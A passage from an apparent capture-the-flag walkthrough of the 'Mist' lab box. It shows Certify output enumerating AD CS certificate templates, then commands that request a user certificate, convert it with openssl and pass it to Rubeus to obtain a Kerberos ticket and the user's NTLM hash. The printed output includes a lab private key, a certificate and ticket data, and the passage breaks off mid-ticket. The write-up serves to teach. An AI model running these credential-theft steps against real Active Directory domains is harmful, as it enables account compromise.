    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : DomainControllerAuthentication
    Schema Version                        : 2
    Validity Period                       : 75 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : DirectoryEmailReplication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Directory Service Email Replication
    mspki-certificate-application-policy  : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : KerberosAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : ComputerAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : Client Authentication, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Computers         S-1-5-21-1045809509-3006658589-2426055941-515
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : ManagerAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_COMMON_NAME
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email, Server Authentication
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Certificate Services     S-1-5-21-1045809509-3006658589-2426055941-1132
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : BackupSvcAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_COMMON_NAME
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\CA Backup                S-1-5-21-1045809509-3006658589-2426055941-1134
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

Certify completed in 00:00:07.5496570

```

There’s a ton of output there. There’s a few interesting parts. I’ll need the CA name and information:

```

[*] Listing info about the Enterprise CA 'mist-DC01-CA'

    Enterprise CA Name            : mist-DC01-CA
    DNS Hostname                  : DC01.mist.htb
    FullName                      : DC01.mist.htb\mist-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=mist-DC01-CA, DC=mist, DC=htb
    Cert Thumbprint               : A515DF0E980933BEC55F89DF02815E07E3A7FE5E
    Cert Serial                   : 3BF0F0DDF3306D8E463B218B7DB190F0
    Cert Start Date               : 2/15/2024 7:07:23 AM
    Cert End Date                 : 2/15/2123 7:17:23 AM
    Cert Chain                    : CN=mist-DC01-CA,DC=mist,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11                                   
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544                                 
      Allow  ManageCA, ManageCertificates               MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
      Allow  ManageCA, ManageCertificates               MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
    Enrollment Agent Restrictions : None  

```

The first available template is named `User`:

```

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH                      
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions                           
      Enrollment Permissions              
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519                                                         
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519                                                         
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

```

I’ll use that template to get a certificate:

```

PS C:\xampp\htdocs\files> .\Certify.exe request /ca:DC01\mist-DC01-CA /template:User

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : MIST\Brandon.Keywarp
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb

[*] Certificate Authority   : DC01\mist-DC01-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 61

[*] cert.pem         :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1lvZxVWlTXE8reT1/3beWDxdMw/EOs2wJEQ51xQtLRVE4BgQ
DxycikLLPRXBq6RmsgjM03o+okqZ0ZHWi+Rgn5OmZBB0pEsoEy/70604d+QbIQZc
DE0QOK5KgcB0mDLilsiq0BSNd98AVraKfPrJjNpVobtZuCGFsGAv3N21bbqz+eUA
LmjHVR7RdfB9UL7lEg4lo/9ep44ooRNAlKY9wkpDAajg7rcJu/rx7+MWvbGT51ZR
gQNcw8JkmpTFN8uJRu6Em/qc8D2PtCiCQFjuOHYg7B2w7l7pq700pmOic9o4di++
JY5l5d5lOk62bbqYacN514WRXUszvrY4/JnWWQIDAQABAoIBAAKgX3u2f+8B+y9a
RdVafIDyRGYSxGHAEW9wUpEbEy6hOxXP1aqJvDVJejoGYTgcLJHz36absdbFOTtD
ITDXnIN4CKrjNLqqnRQXG2vNjIqThe2SqWARNaisIgeS9xrCTNpyHP2tssoMNnHZ
jLrZS8zpA/GWXRQPfRbbJtr68HUmtbvA9fDNvxZfsEKYrX0AUT4LlXGZMwDQeRu7
xW3fXFcF07ffqZX970ofhfqsIlGhzDA7Uxs9Sn+cFS0Vrmgb9sGkvNGZGg2ADQEL
LhNyZ556dR6fK0TzEJE4vuCmSoTEcrAD+tK7wXrjdadN9JZPaYPUi+19XVNFYoD7
eSCJtS0CgYEA3Qi7ZPVCycSf9f7JRjvrfWTw+wJnhZi2KC3UR9UK1Q2tBfsINTx4
ITG0DZBE70LAQy/e6rYl1JQoZ1tDe5JMSMnU0qfnZd9aVDJjWHwoxYr1zpdka5mn
giLlQY4FldBnEPU6p7BQRuzt1lS4TMTmOaS0trL79xyf9X4wLMEWz3MCgYEA+ETJ
bMC9dRPqF6Dvt1fWMlH9xI5CiQiid54BEl3NEyTHuNFEEiSH0ylrhaBMiwWV4CtZ
Ad7SxrQJ9TlOQwSzlCP/FkUTpS4vRBWjA09aOFYf2h3MHXFNZYfJkl8WlWMP3G/Z
FZfOykio+SJI+k/iInA8bbEJgIuuLya1Miqq+AMCgYEAlnimUfFheUgg+W9tCCIs
i13Xa5nUba9remjQleIjkKzRuDuP9+Xlhft3LrCjLRqNFnAVWkWL9W6zHsGTbCFJ
S1gTSSFCtyhZLu5qkUdc3jZeZjjMBTBCR6aH2Zvck4OfVn0LZDL0Q4Rx2TItkR2N
+Xn2CFZKj4xuHMq98wm0BJ8CgYEAtEM1wWoc5gJkqW1oQMZdN0JDMNFeTCNh29p0
ysIi4fCFt5Lyiv3NRSxA7tBaY2LV1OOEiBAjGLWmuVA3m/+w6DJOx/u17Oyg0x2m
tAOM7XTTQcr65rHa0YqLeGTkf+lindr0U3JbapLhZatYM6+G8RxvM/IkhRpmicPg
MqG6a8MCgYBvkjnx69LTxWwKOHX8zV8h37gqEUrsxWMl9+20HKIxbi4TatLE1IT1
0riJaLrFtA8WEkwDwu1vNjkWgLrk+gXIEVioSi2kJ8tiwYtb1brcLHFefcrtTDHE
zGAOy+6y3c9iz97H6oIVZSb4k1UTCaU6BfpQHdCSPNv9xDvoPo/oTA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGDzCCBPegAwIBAgITIwAAAD3BBSq4myDfFgAAAAAAPTANBgkqhkiG9w0BAQsF
ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEbWlzdDEV
MBMGA1UEAxMMbWlzdC1EQzAxLUNBMB4XDTI0MTAyMzEzNDg1M1oXDTI1MTAyMzEz
NDg1M1owVTETMBEGCgmSJomT8ixkARkWA2h0YjEUMBIGCgmSJomT8ixkARkWBG1p
c3QxDjAMBgNVBAMTBVVzZXJzMRgwFgYDVQQDEw9CcmFuZG9uLktleXdhcnAwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDWW9nFVaVNcTyt5PX/dt5YPF0z
D8Q6zbAkRDnXFC0tFUTgGBAPHJyKQss9FcGrpGayCMzTej6iSpnRkdaL5GCfk6Zk
EHSkSygTL/vTrTh35BshBlwMTRA4rkqBwHSYMuKWyKrQFI133wBWtop8+smM2lWh
u1m4IYWwYC/c3bVturP55QAuaMdVHtF18H1QvuUSDiWj/16njiihE0CUpj3CSkMB
qODutwm7+vHv4xa9sZPnVlGBA1zDwmSalMU3y4lG7oSb+pzwPY+0KIJAWO44diDs
HbDuXumrvTSmY6Jz2jh2L74ljmXl3mU6TrZtuphpw3nXhZFdSzO+tjj8mdZZAgMB
AAGjggLpMIIC5TAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYK
KwYBBAGCNwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBE
BgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAw
BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNwZoSHwj2QqrpgAVqU5XqU+
8kvcMB8GA1UdIwQYMBaAFAJHtA9/ZUDlwTbDIo9S3fMCAFUcMIHEBgNVHR8Egbww
gbkwgbaggbOggbCGga1sZGFwOi8vL0NOPW1pc3QtREMwMS1DQSxDTj1EQzAxLENO
PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
b25maWd1cmF0aW9uLERDPW1pc3QsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlv
bkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuwYI
KwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1taXN0LURD
MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlzdCxEQz1odGI/Y0FDZXJ0aWZpY2F0
ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMwYDVR0R
BCwwKqAoBgorBgEEAYI3FAIDoBoMGEJyYW5kb24uS2V5d2FycEBtaXN0Lmh0YjBP
BgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMTA0NTgw
OTUwOS0zMDA2NjU4NTg5LTI0MjYwNTU5NDEtMTExMDANBgkqhkiG9w0BAQsFAAOC
AQEAZdViPLR9HPaBH577QgPfPReTtO0ppextzP4RQGuODhENVSr7X1A5+xrLLQhi
w7MduGOXSSG1bjsohAwg9+y7WxKH8RK/0jmukM0Pt4C9B0YYkn/akJRSAS2ljrZe
UzuZoEP0UVD/N/g1VcH2zoaIB5BDAoTdWcFFx873JplDg99RAYuHWIATJlA2oS3S
Tv7gsAT4KwJG8aDTrMqof11xzfcPaDspfZfpsDo4mGOvuHmTezjAyCToeNQY6ndL
1bTEukyOdffCzy/kmSH5trGPi8n/p6cEMj9uNLS2PbC3jCJ57ue05JBuBvfvvuQw
iHVHnzzNxeWd5vfiBOr9VqgR0A==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:13.2660902

```

#### Convert

At the bottom of the output, it says:

```

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

```

I’ll copy the `cert.pem` value (both private key and certificate) to my host and use that command:

```

oxdf@hacky$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:

```

I’ll give it an empty password each time. I’ll upload `cert.pfx` to Mist.

#### Dump Hash

Now Rubues can use this to get the NTLM hash for the user:

```

PS C:\xampp\htdocs\files> .\rubeus.exe asktgt /user:brandon.keywarp /certificate:C:\xampp\htdocs\files\cert.pfx /getcredentials /show /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Got domain: mist.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\brandon.keywarp'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGGDCCBhSgAwIBBaEDAgEWooIFMjCCBS5hggUqMIIFJqADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBPIwggTuoAMCARKhAwIBAqKCBOAEggTcFnaG88E8IlOObPCrKQ4mYJvZsJUeenSc2JCQZrfNXPS95V3pQyrJYQZzyEblJE8IZ1hlR9Sp79VA9nWQKovsBgdX4tE6FGMfRymsh2pplo5LWHznMbLf/S/VJc8+ZdguOIVA9G5JpYVARa3v7Z0fEzJ45J5qW+gxJ7uQ7CIkAAxUbyTXodA9+ZOHOjao2NAmJ2rl9O3T26Mv+/C/Hgd2A2WSItxyQiqBg0Byvpe51LgB7iV8OyX2wyMdAiSF/3ymhrTPjhQB9hXq4fHmHe1VnVbnujhZxwry5SQ689ciLQ6enohdE1rmTr4YIjqpuBvPgwGO8mgNvrMugPp+5Ppzz28GuVcKdSFoEy1w9yu3ISY55wZMFzPcergJ8hKLyRYfY4XQjZAoRmf9OfuRLIYw02fSLXLNVhFb6pBF9kJ0r+t1f1U20dcOID5YvvUefR7MRe89WMUahUTvR1Mh9yZWNAPrhEVBbEwhBaFSRek10eXV5Yekf6p1VI5A+/Ofy2kFVdYe22IHJlFdojcgXGD/0PJNbov1M1v9QTQU+2jT74Ee41UzJdRKsbX/RmcIzhSkFed6cu7tkLua5DO1n0mCStH4dwedpgtvHxuWgnyWCY/amMvYz++xInV0lrACajtfpr1sDu+0L7oTwIhGybK4BuvV8F6UlrkfbQAbB20BfNyv9/tXqlPcuAu3rLlMwdGUR2b+T0LE17HjwAvjzLidgRS6uTUaWXWdGYFaiLPsvI0rP7Awc6zz4vkwmhkab38/iLEs1sJZc1pdUjkNr+uECgO3V1xrz+Lt/+PgvZuDZvKtEfbuHaM1BHArsXC2TtSGj2BSpbtvd6sX8pPeXWN6PZkrvPUSABjI6K78Bxf2vB5ZZXZJjHV0n2m3/cH30zUoUkv4jbS2KnYp+9jS+ipBJyt//Cc9EwbOBlZu1rukrf7aWgJT1yEKsUsOVSTX0833jlRScbnXL4HIsg+rN4T8XOpi4AxZ6MyD1G3mtr1+4ap/J7F9VT8xSkWd5IJgwmSYrP9L/D1+PmK0e2UtceBtmZFLZiZXcWRwVL3lxqrAGEm/ojbrw6PdOKzkP02diGX0GUcZm3lStwNmleAJrBq7c/f3rKjdWCclhEsFPp70dkRS6L1jfUAETiFGsvNgxfD3RSxtEVBkmqnpqsCfuZG3aW/7fAjNNWFNYvPwqxzu6YxHrblHhqdNjLddLrNmKKu6EGHuoqlEc2H+8sH+1uJlOY0EDWpBAQ7dkLvB+2aHxJ48Mu/WNQbjXpLZQy0aYcoBQqURn2CSEQ8zQa0agmEg3ycLB5RDJauM1oe3eLip97m3l/wQRFZ+hCi5oxxvXpG9YCrqz/TBOfdd1kgo+o8Sl8Sf9eBRNzGR4GI4